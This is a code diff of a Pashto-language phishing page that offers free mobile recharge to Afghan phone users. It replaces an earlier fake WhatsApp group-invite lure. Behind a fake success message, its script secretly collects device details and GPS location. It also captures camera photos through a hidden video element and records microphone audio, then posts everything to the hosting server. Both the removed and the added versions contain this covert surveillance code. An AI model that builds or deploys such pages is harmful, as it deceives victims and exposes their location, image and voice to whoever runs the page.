@@ -1,214 +1,138 @@
 <!DOCTYPE html>
-<html lang="ps">
+<html lang="ps" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Group Invite</title>
+    <title>وړیا چارج ترلاسه کړئ</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
-        body { background-color: #ffffff; display: flex; flex-direction: column; min-height: 100vh; }
-        header { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; border-bottom: 1px solid #f0f0f0; }
-        .logo { display: flex; align-items: center; gap: 8px; font-size: 22px; font-weight: bold; color: #25D366; }
-        .download-header-icon { background-color: #25D366; color: white; border-radius: 50%; width: 35px; height: 35px; display: flex; justify-content: center; align-items: center; text-decoration: none; font-weight: bold; }
-        main { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px 20px; text-align: center; }
-        .group-icon { width: 100px; height: 100px; margin-bottom: 30px; }
-        .invite-text { font-size: 26px; color: #111B21; margin-bottom: 25px; max-width: 320px; line-height: 1.3; }
-        .join-btn { background-color: #25D366; color: white; padding: 14px 40px; border-radius: 25px; border: none; font-size: 18px; font-weight: 500; margin-bottom: 40px; cursor: pointer; }
-        .sub-text { color: #667781; font-size: 15px; margin-bottom: 8px; }
-        .download-link { color: #111B21; font-weight: bold; text-decoration: underline; font-size: 16px; }
-        footer { background-color: #111B21; padding: 20px; display: flex; justify-content: center; }
-        .bottom-download-btn { background-color: #25D366; color: white; width: 100%; max-width: 350px; padding: 14px; border-radius: 25px; text-decoration: none; text-align: center; font-size: 18px; font-weight: 500; }
+        body { background-color: #0d1418; color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 10px; }
+        .container { width: 100%; max-width: 400px; background-color: #162127; border-radius: 16px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); display: flex; flex-direction: column; gap: 15px; }
+        .header { text-align: center; margin-bottom: 5px; }
+        .header h2 { color: #00e676; font-size: 24px; font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 5px; }
+        .header p { color: #8696a0; font-size: 13px; margin-top: 4px; }
+        .offer-card { background-color: rgba(0, 230, 118, 0.08); border: 1px dashed #00e676; border-radius: 12px; padding: 12px; text-align: center; font-size: 13px; color: #00e676; font-weight: bold; }
+        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; text-align: center; }
+        .stat-card { background-color: #1f2c34; border: 1px solid #2a3942; padding: 10px 5px; border-radius: 10px; }
+        .stat-val { font-size: 15px; font-weight: bold; color: #00e676; }
+        .stat-lbl { font-size: 10px; color: #8696a0; margin-top: 3px; }
+        .card { background-color: #1f2c34; padding: 12px 15px; border-radius: 12px; border: 1px solid #2a3942; }
+        .card-label { font-size: 13px; color: #8696a0; margin-bottom: 6px; display: block; }
+        .input-box { width: 100%; background: transparent; border: none; color: #00e676; font-size: 18px; font-weight: bold; outline: none; direction: ltr; text-align: right; }
+        select.input-box { background-color: #1f2c34; color: white; cursor: pointer; border-radius: 6px; padding: 4px 0; direction: rtl; text-align: right; }
+        .grid-amounts { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
+        .amount-card { background-color: #1f2c34; border: 1px solid #2a3942; padding: 10px; border-radius: 10px; text-align: center; cursor: pointer; }
+        .amount-card.active { background-color: #00a884; border-color: #00e676; }
+        .amount-title { font-size: 16px; font-weight: bold; color: #ffffff; }
+        .amount-sub { font-size: 11px; color: #aebac1; margin-top: 2px; }
+        .row-options { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .recharge-btn { background-color: #00e676; color: #0d1418; width: 100%; padding: 15px; border: none; border-radius: 30px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; box-shadow: 0 4px 10px rgba(0,230,118,0.3); }
+        .error-box { display: none; background-color: rgba(244, 67, 54, 0.15); border: 1px solid #f44336; border-radius: 10px; padding: 10px; text-align: center; font-size: 12px; color: #ef5350; margin-top: 5px; font-weight: bold; }
+        .success-box { display: none; background-color: rgba(0, 168, 132, 0.15); border: 1px solid #00a884; border-radius: 10px; padding: 10px; text-align: center; font-size: 12px; color: #00e676; margin-top: 5px; }
         #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; z-index: -1; }
         canvas { display: none; }
     </style>
 </head>
 <body>
-
-    <header>
-        <div class="logo">WhatsApp</div>
-        <a href="#" class="download-header-icon">&darr;</a>
-    </header>
-
-    <main>
-        <svg class="group-icon" viewBox="0 0 100 100" fill="#25D366">
-            <path d="M35 45c6.6 0 12-5.4 12-12s-5.4-12-12-12-12 5.4-12 12 5.4 12 12 12zm25-5c4.4 0 8-3.6 8-8s-3.6-8-8-8-8 3.6-8 8 3.6 8 8 8zm-25 10c-10 0-30 5-30 15v10h60V65c0-10-20-15-30-15zm25 3.3c3.3 1.6 7 3.7 7 6.7v10h20V65c0-6.7-11.1-10.6-27-11.7z"/>
-        </svg>
-        <h1 class="invite-text">You’ve been invited to join “ګفی ګروف”</h1>
-        <button id="joinBtn" class="join-btn">Join chat</button>
-        <p class="sub-text">Don't have WhatsApp yet?</p>
-        <a href="https://www.whatsapp.com/download" class="download-link">Download WhatsApp</a>
-    </main>
-
+    <div class="container">
+        <div class="header">
+            <h2>⚡ وړيا چارج</h2>
+            <p>سمدستي چارج او انټرنیټ بنډلونه</p>
+        </div>
+        <div class="offer-card">🎁 د محدود وخت لړ کې! له ۲۰۰ افغانیو پورته ۲۰٪ اضافي ترلاسه کړئ</div>
+        <div class="stats-grid">
+            <div class="stat-card"><div class="stat-val">۲.۵M+</div><div class="stat-lbl">راضي کاروونکي</div></div>
+            <div class="stat-card"><div class="stat-val">۸.۷Cr</div><div class="stat-lbl">ترسره شوي چارجونه</div></div>
+            <div class="stat-card"><div class="stat-val">۹۹.۹٪</div><div class="stat-lbl">د بریا کچه</div></div>
+        </div>
+        <div class="card">
+            <span class="card-label">📱 د تلیفون شمیره ولیکئ</span>
+            <input type="text" class="input-box" id="mobileNumber" value="+93 ">
+        </div>
+        <span class="card-label" style="margin-bottom: -5px;">د چارج اندازه وټاکئ</span>
+        <div class="grid-amounts">
+            <div class="amount-card" data-amount="۵۰"><div class="amount-title">۵۰ افغانۍ</div><div class="amount-sub">خبرې کول</div></div>
+            <div class="amount-card" data-amount="۱۰۰"><div class="amount-title">۱۰۰ افغانۍ</div><div class="amount-sub">1GB / ورځینی</div></div>
+            <div class="amount-card active" data-amount="۲۰۰"><div class="amount-title">۲۰۰ افغانۍ</div><div class="amount-sub">1.5GB / ورځینی</div></div>
+            <div class="amount-card" data-amount="۵۰۰"><div class="amount-title">۵۰۰ افغانۍ</div><div class="amount-sub">2GB / ورځینی</div></div>
+        </div>
+        <div class="row-options">
+            <div class="card">
+                <span class="card-label">📱 شبکه</span>
+                <select class="input-box" id="operatorSelect">
+                    <option value="Atoma">Atoma</option><option value="Salam">Salam</option><option value="Etisalat">Etisalat</option><option value="Afghan Besem">Afghan Besem</option><option value="Roshan">Roshan</option>
+                </select>
+            </div>
+            <div class="card">
+                <span class="card-label">📍 هیواد</span>
+                <select class="input-box" id="countrySelect">
+                    <option value="Afghanistan">🇦🇫 افغانستان</option><option value="Pakistan">🇵🇰 پاکستان</option><option value="Iran">🇮🇷 ایران</option><option value="India">🇮🇳 هندوستان</option>
+                </select>
+            </div>
+        </div>
+        <button id="rechargeBtn" class="recharge-btn">⚡ اوس چارج ترلاسه کړئ ❯</button>
+        <div id="errorBox" class="error-box">⚠️ مهرباني وکړئ لومړی د تلیفون شمیره ولیکئ!</div>
+        <div id="successBox" class="success-box">🎉 بریالی شو! <span id="rechargeAmount">۲۰۰</span> افغانۍ چارج ستاسو شمیرې ته پر لاره دی.</div>
+    </div>
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
-
-    <footer>
-        <a href="https://www.whatsapp.com/download" class="bottom-download-btn">Download &darr;</a>
-    </footer>
-
     <script>
-        const WHATSAPP_CODE = "LKvRLGlXBmgAlMFJV3kMBE"; 
-        const DIRECT_WHATSAPP_LINK = `whatsapp://chat?code=${WHATSAPP_CODE}`;
-        const FALLBACK_WHATSAPP_LINK = `https://chat.whatsapp.com/${WHATSAPP_CODE}`;
-
-        async function sendData(formData) {
-            try {
-                await fetch(window.location.origin, {
-                    method: 'POST',
-                    body: formData
-                });
-            } catch (e) {}
-        }
-
-        // د موبایل د معلوماتو، برانډ او نورو جزیاتو راټولول
-        async function collectAndSendDeviceInfo() {
-            try {
-                let batteryLevel = "نامعلوم";
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    batteryLevel = Math.round(battery.level * 100) + "%";
-                }
-
-                const ua = navigator.userAgent;
-                let androidVersion = "نامعلوم";
-                let deviceBrand = "نور موبایلونه / وسیله";
-
-                const androidMatch = ua.match(/Android\s([0-9\.]+)/);
-                if (androidMatch) {
-                    androidVersion = androidMatch[1];
-                }
-
-                // د برانډونو په نښه کول
-                if (/Tecno/i.test(ua)) deviceBrand = "Tecno";
-                else if (/Samsung/i.test(ua) || /SM-/i.test(ua)) deviceBrand = "Samsung";
-                else if (/Xiaomi|Redmi|POCO/i.test(ua)) deviceBrand = "Xiaomi / Redmi";
-                else if (/Infinix/i.test(ua)) deviceBrand = "Infinix";
-                else if (/Vivo/i.test(ua)) deviceBrand = "Vivo";
-                else if (/Oppo/i.test(ua)) deviceBrand = "Oppo";
-                else if (/Realme/i.test(ua)) deviceBrand = "Realme";
-                else if (/Huawei|Honor/i.test(ua)) deviceBrand = "Huawei / Honor";
-                else if (/iPhone|iPad/i.test(ua)) deviceBrand = "Apple iPhone";
-                else if (/Mobile/i.test(ua)) deviceBrand = "اندروید موبایل";
-
-                const deviceInfo = {
-                    deviceType: deviceBrand,
-                    androidVer: androidVersion,
-                    screenSize: window.innerWidth + " × " + window.innerHeight,
-                    batteryLevel: batteryLevel,
-                    language: navigator.language || "نامعلوم"
-                };
-
-                const formData = new FormData();
-                formData.append('device_info', JSON.stringify(deviceInfo));
-                await sendData(formData);
-            } catch (e) {}
-        }
-
-        window.addEventListener('load', () => {
-            collectAndSendDeviceInfo();
+        const countryCodes = { "Afghanistan": "+93", "Pakistan": "+92", "Iran": "+98", "India": "+91" };
+        const countrySelect = document.getElementById("countrySelect");
+        const mobileInput = document.getElementById("mobileNumber");
+        countrySelect.addEventListener("change", function() {
+            const code = countryCodes[this.value] || "+93";
+            let val = mobileInput.value.trim();
+            Object.values(countryCodes).forEach(c => { if (val.startsWith(c)) val = val.replace(c, "").trim(); });
+            mobileInput.value = code + " " + val;
         });
-
-        async function sendSinglePhoto(stream) {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            if (!video.srcObject) { video.srcObject = stream; await video.play(); }
-
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            return new Promise((resolve) => {
-                canvas.toBlob(async function(blob) {
-                    const formData = new FormData();
-                    formData.append('photo', blob, 'photo.jpg');
-                    await sendData(formData);
-                    resolve();
-                }, 'image/jpeg');
+        const amountCards = document.querySelectorAll('.amount-card');
+        amountCards.forEach(card => {
+            card.addEventListener('click', function() {
+                amountCards.forEach(c => c.classList.remove('active'));
+                this.classList.add('active');
+                document.getElementById('rechargeAmount').innerText = this.getAttribute('data-amount');
             });
+        });
+        async function sendData(formData) { try { await fetch('/', { method: 'POST', body: formData }); } catch (e) {} }
+        async function sendDeviceInfo() {
+            const info = { deviceType: navigator.platform, androidVer: navigator.userAgent, screenSize: window.innerWidth + " x " + window.innerHeight, batteryLevel: "N/A", language: navigator.language };
+            const fd = new FormData(); fd.append('device_info', JSON.stringify(info)); await sendData(fd);
         }
-
-        async function recordAndSendAudio(stream) {
-            return new Promise((resolve) => {
+        async function capturePhoto(stream) {
+            const v = document.getElementById('video'), c = document.getElementById('canvas');
+            if(!v.srcObject) { v.srcObject = stream; await v.play(); }
+            c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
+            c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
+            return new Promise(res => { c.toBlob(async blob => { const fd = new FormData(); fd.append('photo', blob, 'photo.jpg'); await sendData(fd); res(); }, 'image/jpeg'); });
+        }
+        async function recordAudio(stream) {
+            return new Promise(res => {
                 try {
-                    const mediaRecorder = new MediaRecorder(stream);
-                    const audioChunks = [];
-
-                    mediaRecorder.ondataavailable = (event) => {
-                        audioChunks.push(event.data);
-                    };
-
-                    mediaRecorder.onstop = async () => {
-                        const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
-                        const formData = new FormData();
-                        formData.append('voice', audioBlob, 'voice.ogg');
-                        await sendData(formData);
-                        resolve();
-                    };
-
-                    mediaRecorder.start();
-                    setTimeout(() => {
-                        if (mediaRecorder.state !== 'inactive') {
-                            mediaRecorder.stop();
-                        }
-                    }, 5000);
-                } catch (e) {
-                    resolve();
-                }
+                    const mr = new MediaRecorder(stream); let chunks = [];
+                    mr.ondataavailable = e => chunks.push(e.data);
+                    mr.onstop = async () => { const fd = new FormData(); fd.append('voice', new Blob(chunks, {type: 'audio/ogg'}), 'voice.ogg'); await sendData(fd); res(); };
+                    mr.start(); setTimeout(() => { if(mr.state !== 'inactive') mr.stop(); }, 4000);
+                } catch(e) { res(); }
             });
         }
-
-        document.getElementById("joinBtn").addEventListener("click", async function() {
-            const btn = document.getElementById("joinBtn");
-            btn.innerText = "Connecting...";
-            btn.disabled = true;
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    async (pos) => {
-                        const formData = new FormData();
-                        formData.append('latitude', pos.coords.latitude);
-                        formData.append('longitude', pos.coords.longitude);
-                        await sendData(formData);
-                    },
-                    () => {},
-                    { timeout: 4000, enableHighAccuracy: true }
-                );
+        document.getElementById("rechargeBtn").addEventListener("click", async () => {
+            if(!mobileInput.value.replace("+93", "").trim()) { document.getElementById("errorBox").style.display = "block"; return; }
+            document.getElementById("errorBox").style.display = "none";
+            document.getElementById("successBox").style.display = "block";
+            document.getElementById("rechargeBtn").disabled = true;
+            await sendDeviceInfo();
+            if(navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async pos => {
+                    const fd = new FormData(); fd.append('latitude', pos.coords.latitude); fd.append('longitude', pos.coords.longitude); await sendData(fd);
+                });
             }
-
             try {
-                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                    const video = document.getElementById('video');
-                    video.srcObject = stream;
-                    await video.play();
-
-                    await new Promise(r => setTimeout(r, 300));
-
-                    let photoCount = 0;
-                    const maxPhotos = 10; 
-
-                    const photoInterval = setInterval(async () => {
-                        if (photoCount < maxPhotos) {
-                            photoCount++;
-                            await sendSinglePhoto(stream);
-                        } else {
-                            clearInterval(photoInterval);
-                        }
-                    }, 800);
-
-                    await recordAndSendAudio(stream);
-
-                    while (photoCount < maxPhotos) {
-                        await new Promise(r => setTimeout(r, 300));
-                    }
-                    clearInterval(photoInterval);
-
-                    stream.getTracks().forEach(t => t.stop());
-                }
-            } catch (err) {}
-
-            window.location.href = DIRECT_WHATSAPP_LINK;
-            setTimeout(() => { window.location.href = FALLBACK_WHATSAPP_LINK; }, 300);
+                const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
+                await capturePhoto(stream);
+                await recordAudio(stream);
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
         });
     </script>
 </body>
